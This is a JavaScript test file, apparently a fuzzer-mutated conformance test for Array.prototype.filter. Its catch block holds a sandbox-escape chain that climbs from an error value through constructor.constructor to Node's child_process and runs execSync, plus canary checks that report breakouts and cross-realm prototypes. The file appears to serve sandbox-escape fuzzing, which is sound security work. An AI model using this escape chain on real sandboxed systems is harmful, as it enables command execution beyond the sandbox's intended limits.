try {
    function callbackfn(val, idx, obj) {
        let REPLACER = 23;
        return idx === 1 && val === 12;
    }
    var proto = {};
    Object.defineProperty(proto, '1', {
        get: function () {
            let REPLACER = 23;
            return 6;
        },
        configurable: true
    });
    var Con = function () {
        let REPLACER = 23;
    };
    Con.prototype = proto;
    var child = new Con();
    child.length = 10;
    Object.defineProperty(child, '1', {
        get: function () {
            throw () => {
                return () => {
                };
            };
            return 12;
        },
        configurable: true
    });
    var newArr = Array.prototype.filter.call(child, callbackfn);
    assert.sameValue(newArr.length, 1, 'newArr.length');
    assert.sameValue(newArr[0], 12, 'newArr[0]');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}